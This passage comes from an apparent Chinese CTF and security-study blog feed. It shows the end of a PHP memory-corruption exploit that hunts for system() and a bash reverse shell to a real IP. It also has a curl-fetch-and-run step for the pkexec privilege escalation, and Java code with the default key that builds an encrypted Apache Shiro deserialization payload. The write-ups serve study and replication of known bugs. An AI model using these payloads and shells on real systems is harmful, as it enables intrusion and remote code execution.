starting</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// In that case, changing the direction of the search should fix the crash.</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// $addr += 0x10;</span></span></span><br><span class="line"><span class="language-php">            <span class="variable">$addr</span> -= <span class="number">0x10</span>;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>, <span class="number">4</span>) === <span class="number">0xA8</span> &amp;&amp;</span></span><br><span class="line"><span class="language-php">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">4</span>, <span class="number">4</span>),</span></span><br><span class="line"><span class="language-php">                    [<span class="number">20151012</span>, <span class="number">20160303</span>, <span class="number">20170718</span>, <span class="number">20180731</span>, <span class="number">20190902</span>, <span class="number">20200930</span>])) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="variable">$module_name_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x20</span>);</span></span><br><span class="line"><span class="language-php">                <span class="variable">$module_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$module_name_addr</span>);</span></span><br><span class="line"><span class="language-php">                <span class="keyword">if</span>(<span class="variable">$module_name</span> === <span class="number">0x647261646e617473</span>) &#123;</span></span><br><span class="line"><span class="language-php">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;standard module @ 0x%x&quot;</span>, <span class="variable">$addr</span>);</span></span><br><span class="line"><span class="language-php">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x28</span>);</span></span><br><span class="line"><span class="language-php">                &#125;</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">do</span> &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$f_entry</span>, <span class="number">6</span>);</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="variable">$f_name</span> === <span class="number">0x6d6574737973</span>) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span></span><br><span class="line"><span class="language-php">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> !== <span class="number">0</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;hfp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;hfp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQ&#x27;</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr));</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; FILTER_SIZE - <span class="number">0x10</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;hfp, <span class="string">&quot;\x00&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params"><span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$address</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$n</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$address</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$out</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$val</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(LOGGING) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;<span class="subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="variable">$val</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params"><span class="variable">$size</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$size</span>));</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/1.117.144.41/4444 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p>然后pkexec提权，项目地址：<a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://120.27.248.81/p &gt; ./p</span><br><span class="line"><span class="built_in">chmod</span> 777 p</span><br><span class="line">./p</span><br></pre></td></tr></table></figure><h1 id="gocalc"><a href="#gocalc" class="headerlink" title="gocalc"></a>gocalc</h1><p>go注入未复现，待有时间接触go之后再学，直接学注入肯定效果不好。</p>]]></content>
    
    
    <summary type="html">vnctf2022复现</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>初始shiro反序列化漏洞</title>
    <link href="https://xianbeil.github.io/2022/04/06/shiro-1-cc/"/>
    <id>https://xianbeil.github.io/2022/04/06/shiro-1-cc/</id>
    <published>2022-04-05T18:32:27.000Z</published>
    <updated>2022-04-22T10:40:51.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本篇分为上下两部分</p><ul><li>介绍shiro,调试分析shiro出现反序列化漏洞的根本原因</li><li>通过自己修改CC链来攻击shiro应用</li></ul><blockquote><p>关于shiro的基本学习，概念，就不发博客了</p></blockquote><h1 id="简单的shiro应用搭建"><a href="#简单的shiro应用搭建" class="headerlink" title="简单的shiro应用搭建"></a>简单的shiro应用搭建</h1><p>p牛写的一个最简单的shiro登录应用，没有适用任何框架，十分简单。</p><p><a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p>我们配置一下自己的maven，配置一下tomcat发布就行。</p><p>用root&#x2F;secret登录，返回一个remeberMe就说明搭建ok了</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405200324-qnipuyf.png" alt="image.png"></p><h1 id="shiro反序列化漏洞原理剖析"><a href="#shiro反序列化漏洞原理剖析" class="headerlink" title="shiro反序列化漏洞原理剖析"></a>shiro反序列化漏洞原理剖析</h1><p>从简介中我们得知，是Cookie中的remberMe字段出的问题，shiro会将它解密之后反序列化。</p><p>所以要针对remberMe来进行分析</p><h2 id="生成remberMe"><a href="#生成remberMe" class="headerlink" title="生成remberMe"></a>生成remberMe</h2><p>shiro生成remberMe的地方在<code>org.apache.shiro.mgt.DefaultSecutiryManager</code>的login方法，可以打上断点调试。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405225302-71rolmh.png" alt="image.png"></p><p>截获断点，当登陆成功的时候，会进入下面的<code>createSubject</code>，创建一个新的Subject</p><blockquote><p>Subject: 为<code>认证主体</code>。应用代码直接交互的对象是Subject,Subject代表了当前的用户。包含<code>Principals</code>和<code>Credentials</code>两个信息。</p></blockquote><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230135-k2h55d5.png" alt="image.png"></p><p>步入下面的onSuccessfulLogin()方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230700-ilvuwi4.png" alt="image.png"></p><p>这里的token为我们浏览器传入的数据，其中remberMe为true，代表开启remberMe</p><p>subject是传进来的loggin</p><p>步入rmm.onSuccessfulLogin方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230944-hofzlf3.png" alt="image.png"></p><p>继续跟进，最终发现序列化accountPrincipals对象的地方在这里：</p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code> 的convertPrincipalsToBytes方法中</p><p>下面也能看到完整方法栈，如果想调试可以参考。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405231222-d49u3to.png" alt="image.png"></p><p>然后在这里base64编码然后设置为cookie</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405231629-6wc4wmc.png" alt="image.png"></p><h2 id="解析remberMe"><a href="#解析remberMe" class="headerlink" title="解析remberMe"></a>解析remberMe</h2><p>用刚刚生成的正常的remberMe来调试反序列化，直接锁定<code>AbstractRememberMeManager</code>这个类在解密的地方打上断点，（不知道前面的过程但是肯定要解密反序列化吧）</p><p>发包的时候要删除原来的JSSESSID，建立一个新会话</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405233813-vkelq2w.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405233904-io898k8.png" alt="image.png"></p><p>哦吼，截获了断点，获得了方法栈，往上面追溯到<code>DefaultSecutiryManager</code>进行调试</p><p>跟进getRemberedIdentity方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405234603-s7io7wr.png" alt="image.png"></p><p>此时我们的remberMe在这个里面，可以自行展开看，截图不够了<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405234858-u1tfgzy.png" alt="image.png"></p><p>跟进getRememberedIdentity方法：</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235039-pxih2yy.png" alt="image.png"></p><p>这里应该是要反序列化获得Principals对象了</p><p>跟进方法，发现这里先通过一个方法来获得字节数组，然后再反序列化</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235134-8e2icfj.png" alt="image.png"></p><p>先看getRemberedSerializedIdentity方法</p><p>这个方法中base64解码了我们传入的remberMe字段，转化为字节数组然后返回</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235336-ym3alnt.png" alt="image.png"></p><p>convertBytesToPrincipals方法先进行解密，然后反序列化</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235525-7gdo2js.png" alt="image.png"><br /></p><p>（中间跳过了几个步骤）在这里readObject</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406000506-u1b6prl.png" alt="image.png"></p><h2 id="aes-key"><a href="#aes-key" class="headerlink" title="aes key"></a>aes key</h2><p>其实这个过程中可以发现一个很关键的问题，就是aes的密钥，如果密钥错了是不能够反序列化的</p><p>所以只有知道密钥才能够触发remberMe带来的反序列化漏洞，而在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key。所以高于这个版本的地方这个点就不能使用了。</p><h1 id="ACC6打shiro"><a href="#ACC6打shiro" class="headerlink" title="ACC6打shiro"></a>ACC6打shiro</h1><p>在刚刚的项目中也有一个shiroAttack项目，可以当作参考使用，但是这里我们还是自己建一个项目来生成payload</p><p>因为项目中有commons collections依赖，所以直接生成一个cc6来打</p><h2 id="Transformer数组型"><a href="#Transformer数组型" class="headerlink" title="Transformer数组型"></a>Transformer数组型</h2><p>CommonsCollections6.java</p><blockquote><p>其实参考p牛的写法，之后自己写的时候也可以效仿他getPayload的写法。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对payload进行加密然后base64输出，这里的aes加密器使用shiro自带的<code>org.apache.shiro.crypto.AesCipherService</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generate1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>().getPayload(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">encoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="comment">//使用shiro默认的key对payload进行加密</span></span><br><span class="line">        <span class="type">byte</span>[] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">text</span> <span class="operator">=</span> encoder.encrypt(payload, key);</span><br><span class="line">        System.out.println(text.toString());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后设置为remberMe字段打进去</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406004852-gh6iook.png" alt="image.png"></p><p>随后tomcat报错，没有弹出计算器</p><blockquote><p>怎么根据报错调试：<a href="https://bbs.csdn.net/topics/390369450">https://bbs.csdn.net/topics/390369450</a></p></blockquote><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002311-ineikiu.png" alt="image.png"></p><p>最后面可以看到报错信息<code>Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context,</code></p><p>然后下面其实可以快速到达报错的类，也就是这里抛出的异常，打断点调试</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002428-3tlpqyr.png" alt="image.png"></p><blockquote><p>其实这里已经进入了刚刚分析的反序列化过程，看方法栈就能知道</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002835-lql098z.png" alt="image.png"></p></blockquote><p>这个类继承了ObjectInputStream，并且重写了resolveClass方法</p><p>resolveClass方法是反序列化的时候通过字符串类名来查找类的方法，可以看到forName也是我们熟悉的，它将根据类名来返回这个类的class类类型。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003002-uli0789.png" alt="image.png"></p><blockquote><p>这里和没重写之前的方法的差别在于：</p><p>一个使用原生类Class，这个我们都熟悉</p><p>另一个用的是ClassUtils，这个类位于org.apache.shiro.util包下</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003325-9et2oi5.png" alt="image.png"></p><p>我们看一下org.apache.shiro.util.ClassUtils的forName方法：</p><p>调试多次之后发现前面的HashMap，TiedEntryMap，ChainTransformer都能返回clazz，但是到这个Transformer类就找不到了</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003756-dpwbj29.png" alt="image.png"></p></blockquote><p>导致报错的地方就在这里：</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406004253-n0kqmme.png" alt="image.png"></p><p>你可以清晰的看到类名前面是<code>[L</code>，<code>[L</code>是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</p><p>reference：<a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p><blockquote><p>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p></blockquote><h2 id="TemplatesImpl字节码型"><a href="#TemplatesImpl字节码型" class="headerlink" title="TemplatesImpl字节码型"></a>TemplatesImpl字节码型</h2><p>因为它强行用的是shiro包自带的ClassUtil,所以要避免出现数组,可以参考思路:<a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></p><p>因此我们可以考虑用TemplatesImpl字节码来打</p><blockquote><p>这个时候就考验对cc的学习程度了,因为上面我们发现了问题,就要自己通过CC中各种组件重新构造去解决这个问题</p><p>而重新构造意味着要自己编写payload</p><p>这里虽然p牛写好了,但是还是尽量自己去把整个exp从0到1写出来比较有体会.</p></blockquote><h3 id="如何加载TemplatesImpl"><a href="#如何加载TemplatesImpl" class="headerlink" title="如何加载TemplatesImpl"></a>如何加载TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;/*bytes*/&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure><h3 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015040-mbzwtgq.png" alt="image.png"></p><p>以往我们是这样触发TemplatesImpl的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但这里transform是可以传入一个参数key的,结合InvokeTransformer的transform方法:</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015821-whcvobi.png" alt="image.png"></p><p>那我们可以直接传入,不用第一个<code>new ConstantTransformer(obj),</code>存在了,因为我们也知道这个类的作用就是:<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015901-0cmid5c.png" alt="image.png"></p><p>所以就是这么个构造思路:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry.getValue()</span><br><span class="line">LazyMap.get(key)</span><br><span class="line">InvokeTransformer.transform()</span><br></pre></td></tr></table></figure><p>就是直接把那个类作为参数传给InvokeTransformer就行了,不用通过transform方法递归.</p><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>构造令人头大….总之一步一步来</p><h4 